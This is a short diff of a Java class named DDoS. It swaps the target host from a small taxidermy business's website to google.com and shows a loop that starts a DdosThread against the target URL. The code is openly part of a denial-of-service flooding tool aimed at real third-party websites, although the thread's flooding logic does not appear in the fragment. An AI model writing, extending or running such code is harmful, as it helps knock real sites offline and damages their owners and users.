@@ -6,9 +6,9 @@ import java.net.URLEncoder;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class DDoS { 
-    public static String host = "judkinscustomtaxidermy.com";
+    public static String host = "google.com";
     public static void main(String... args) throws Exception {
-        String testWeb = "https://judkinscustomtaxidermy.com/index.html";
+        String testWeb = "https://google.com/index.html";
         
         for (int i = 0; i < 1; i++) {
             DdosThread thread = new DdosThread(testWeb, host);
